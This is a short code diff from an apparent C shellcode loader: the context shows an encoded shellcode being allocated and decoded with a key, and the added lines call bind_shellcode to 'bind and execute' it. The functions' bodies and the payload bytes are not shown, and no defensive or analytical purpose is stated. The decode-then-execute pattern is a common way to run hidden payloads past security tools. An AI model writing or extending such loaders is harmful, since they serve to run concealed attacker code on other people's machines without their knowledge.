@@ -83,5 +83,8 @@ int main (int argc, char **argv)
 	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
 	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
 	
+	// Bind and execute shellcode
+	bind_shellcode(shellcode);
+	
 	return 0;
 }
